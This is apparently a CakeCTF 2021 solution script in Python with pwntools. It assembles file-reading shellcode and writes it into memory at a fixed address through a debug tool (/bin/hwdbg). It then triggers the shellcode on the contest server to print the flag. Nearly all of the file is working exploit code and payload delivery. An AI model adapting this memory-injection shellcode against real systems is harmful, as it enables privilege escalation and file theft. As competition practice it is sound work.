from pwn import *
from base64 import b64encode

context.arch = "amd64"

a = asm("""
     // open("/flag.txt", )
     lea rdi, [flag+rip]
     xorq rsi, rsi
     mov rax, 2
     syscall
     
     // read(fd, somewhere, 32)
     push rax
     mov rdi, rax
     mov rsi, rsp
     movq rdx, 64
     xor rax, rax
     syscall
     
     // write(fd, somewhere, 32)
     mov rdi, 1
     mov rsi, rsp
     movq rdx, 64
     movq rax, 1
     syscall


flag:
.string "/flag.txt"
        """)

print(a.hex())
print(hex(len(a)))

addr = 0x38e5316 # determined by using https://github.com/martinradev/gdb-pt-dump/ pt -sb
cmd = "echo \"%s\" | base64 -d - | /bin/hwdbg mw %s %s" % (b64encode(a).decode(), hex(len(a)), hex(addr))
print(cmd)

#p = process("./start-qemu.sh")
p = remote("others.cakectf.com", "9005")
p.recvuntil("Welcome to CakeCTF 2021")
p.sendline(cmd)
p.sendline("/bin/hwdbg ior 1 1")
flag = p.recvregex(r"CakeCTF\{.*\}")
print(flag)
p.interactive()
